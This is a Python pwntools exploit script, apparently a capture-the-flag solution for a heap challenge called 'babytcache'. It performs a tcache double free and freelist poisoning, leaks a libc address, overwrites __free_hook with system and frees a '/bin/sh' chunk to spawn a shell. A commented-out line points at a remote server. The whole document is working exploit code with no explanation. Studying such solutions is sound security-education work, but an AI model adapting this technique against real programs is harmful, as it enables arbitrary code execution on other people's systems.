from pwn import *

libc = ELF('./libc.so.6')

def add(idx, size, content):
	r.sendlineafter('>>', '1')
	r.sendlineafter(':', str(idx))
	r.sendlineafter(':', str(size))
	r.sendafter(':', content)

def edit(idx, content):
	r.sendlineafter('>>', '2')
	r.sendlineafter(':', str(idx))
	r.sendafter(':', content)

def free(idx):
	r.sendlineafter('>>', '3')
	r.sendlineafter(':', str(idx))

def show(idx):
	r.sendlineafter('>>', '4')
	r.sendlineafter(':', str(idx))

def DEBUG():
	gdb.attach(r)



r = process('./babytcache')
#r = remote('51.158.118.84', 17002)

add(0, 0x88, 'a')
add(1, 0x88, 'b')
free(0) # 1
free(0) # 2

edit(0, '\x10\x70')
add(2, 0x88, 'a')
add(3, 0x88, '\x07'*0x20) # tcache_perthread_struct
free(0) # 3
show(0)
libc_base = u64(r.recvuntil('\x7f')[-6:]+'\x00'*2) - 0x3ebca0
print "libc_base @ ", hex(libc_base)
system = libc_base + libc.symbols['system']
print "system @ ", hex(system)
free_hook = libc_base + libc.symbols['__free_hook']

edit(3, '\x05'*0x60+p64(free_hook))
add(4, 0x50, p64(system))
edit(0, '/bin/sh\x00')
free(0)

r.interactive()